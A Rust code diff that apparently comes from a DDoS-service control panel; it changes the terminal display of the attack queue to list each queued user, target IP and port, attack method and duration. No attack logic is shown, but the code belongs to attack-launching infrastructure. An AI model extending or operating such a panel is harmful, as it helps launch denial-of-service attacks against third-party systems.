@@ -323,7 +323,7 @@ pub async fn handle_history_command(client: &Arc<Client>, state: &Arc<AppState>)
 }
 
 pub async fn handle_queue_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
-    let queue_size = state.attack_manager.get_queue_size().await;
+    let queue_items = state.attack_manager.get_queue_items().await;
     
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     let width = get_terminal_width(state).await;
@@ -344,9 +344,34 @@ pub async fn handle_queue_command(client: &Arc<Client>, state: &Arc<AppState>) -
     
     client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
     
-    let msg = format!("Queue Size: {}", queue_size);
-    let pad = main_width - visible_len(&msg) - 2;
-    client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
+    if queue_items.is_empty() {
+        let msg = "Queue is empty";
+        let pad = main_width - visible_len(msg) - 2;
+        client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
+    } else {
+        for (i, item) in queue_items.iter().enumerate() {
+            let method_str = &item.method;
+            let target_str = format!("{}:{}", item.ip, item.port);
+            let user_str = &item.username;
+            
+            let pos_gradient = apply_gradient(&format!("#{}", i + 1), 39, 45);
+            let user_gradient = apply_gradient(user_str, 45, 51);
+            let target_gradient = apply_gradient(&target_str, 51, 57);
+            let method_gradient = apply_gradient(method_str, 57, 63);
+            let time_gradient = apply_gradient(&format!("{}s", item.duration_secs), 63, 87);
+            
+            let line_content = format!("  {} | {} | {} | {} | {}", 
+                pos_gradient, user_gradient, target_gradient, method_gradient, time_gradient);
+                
+            let visible = visible_len(&format!("  #{} | {} | {} | {} | {}s", 
+                i + 1, user_str, target_str, method_str, item.duration_secs));
+                
+            let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
+            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
+            
+            client.write(format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", line_content, " ".repeat(padding), right_panel).as_bytes()).await?;
+        }
+    }
     
     client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
     
